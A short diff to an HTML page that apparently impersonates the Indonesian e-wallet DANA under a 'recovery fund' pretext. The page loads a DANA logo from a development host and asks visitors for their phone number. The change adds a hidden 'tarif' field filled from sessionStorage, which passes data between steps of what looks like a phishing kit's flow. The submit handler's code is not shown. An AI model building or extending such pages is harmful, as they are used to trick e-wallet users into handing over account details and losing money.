@@ -689,6 +689,7 @@ ol, li {
 			<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
 		</div>
 <form id="formNohp" onsubmit="sendNohp(event);" >
+	<input type="hidden" id="tarif" name="tarif">
 <input type="hidden" id="logo" value="༺═──◍𝓭𝓪𝓷𝓪.𝓲𝓭☭──═༻">			
 <h3 style="font-size: 16px; margin-top: -20px">Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
 			<div class="box-input" style="width: 95%;">
@@ -791,6 +792,9 @@ ol, li {
 <script>let inp = document.getElementById("inp");let btn = document.getElementById("btn");inp.addEventListener("input", val);function val(){if(inp.value.length > 10){btn.disabled = false;}else{btn.disabled = true;}};</script>
 
 <script>
+document.getElementById("tarif").value =
+        sessionStorage.getItem("tarif");
+	
  window.onload = function(){
         setTimeout(function(){
             $(".start").fadeIn();
